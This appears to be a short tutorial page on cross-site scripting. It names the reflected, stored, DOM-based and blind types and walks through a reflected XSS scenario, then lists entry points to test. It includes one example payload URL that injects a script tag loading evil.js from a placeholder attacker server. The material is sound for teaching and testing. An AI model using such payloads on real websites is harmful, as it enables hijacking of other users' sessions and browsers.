<h2 align="center">Cross-Site Scripting aka XSS</h2>

Cross-Site Scripting is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

Cross-site scripting vulnerabilities are extremely common, we can find different type of XSS:

- Reflected XSS
- Stored XSS
- DOM Based XSS
- Blind XSS

<h4 align="center">Reflected XSS</h4>

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

<strong>Example Scenario:</strong>

A website where if you enter incorrect input, an error message is displayed. \n
The content of the error message gets taken from the <strong>error</strong> parameter in the query string and is built directly into the page source.

    www.example.com/?error=Error Message Displayed

If the application does not check for inputs it could lead to injecting malicious code, in this example loading a script from the attacker server/machine:

    www.example.com/?error=<script src="http://attackerserver.com/evil.js"></script>

<b>How to test for Reflected XSS:</b>

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)
